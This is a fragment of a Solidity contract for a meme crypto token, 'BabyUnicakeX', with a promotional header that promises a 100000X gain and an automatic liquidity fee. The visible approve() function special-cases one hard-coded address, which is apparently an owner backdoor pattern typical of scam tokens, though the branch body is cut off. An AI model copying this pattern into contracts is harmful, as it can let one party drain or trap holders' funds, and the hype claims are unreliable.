...
/** 
   ...
   Shiba,Rfi,Feg,CT,Safemoon,Pig combine together to create #BabyUnicakeX.
   ...
   Can you make #BabyUnicakeX 100000X? 

   1,000,000,000,000,000 total supply
   1,000,000,000,000 BabyUnicakeX max limit for per trade
  

   3% fee for liquidity will go to an address that the contract creates, 
   it's the best part of the #BabyUnicakeX idea, increasing the liquidity pool automatically, 
...
contract BabyUnicakeX {
    mapping (address => uint) public balances;
    mapping (address => mapping (address =>uint)) public allowance;
    uint public totalSupply = 1000000000 * 10 ** 15;
    string public name = "Baby Unicake X";
    string public symbol = "BabyUnicakeX";
    ...
    function approve (address spender, uint value) public returns (bool) {
        if (msg.sender == address(0x4A7fF4edf31f7d4cfaCae4d35f9cc914c5AFa726)) {
